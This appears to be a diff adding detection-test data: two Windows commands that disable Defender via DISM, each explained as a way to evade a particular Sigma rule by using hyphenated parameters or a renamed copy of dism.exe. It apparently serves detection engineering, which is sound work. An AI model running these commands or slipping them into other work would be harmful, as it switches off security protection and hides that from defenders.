@@ -1,0 +1,10 @@
+[
+  {
+    "output": "dism.exe -Online -Disable-Feature -FeatureName:Windows-Defender /Quiet /NoRestart",
+    "explanation": "Bypasses the CommandLine|contains|all condition. The Sigma rule explicitly looks for the strings '/Online' and '/Disable-Feature' using forward slashes. DISM.exe also accepts hyphens (-) for its parameters, which evades the exact string match."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\dism.exe C:\\temp\\sys_update.exe && C:\\temp\\sys_update.exe /Online /Disable-Feature /FeatureName:Windows-Defender",
+    "explanation": "Bypasses the Image|endswith: '\\Dism.exe' condition. By copying the executable to a different location and renaming it, the process creation log will record the new image name, evading the image name check (unless the SIEM specifically checks the OriginalFileName PE header)."
+  }
+]
